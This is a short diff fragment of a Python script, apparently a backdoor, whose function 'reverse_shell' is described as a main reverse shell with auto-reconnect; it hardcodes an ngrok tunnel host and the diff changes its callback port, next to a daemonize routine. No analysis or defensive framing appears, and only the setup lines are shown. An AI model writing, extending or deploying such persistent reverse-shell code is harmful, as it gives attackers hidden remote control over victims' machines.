@@ -44,7 +44,7 @@ def daemonize():
 def reverse_shell():
     """Main reverse shell function dengan auto-reconnect"""
     HOST = "0.tcp.ap.ngrok.io"
-    PORT = 19424
+    PORT = 17036
     RECONNECT_DELAY = 10
     
     while True:
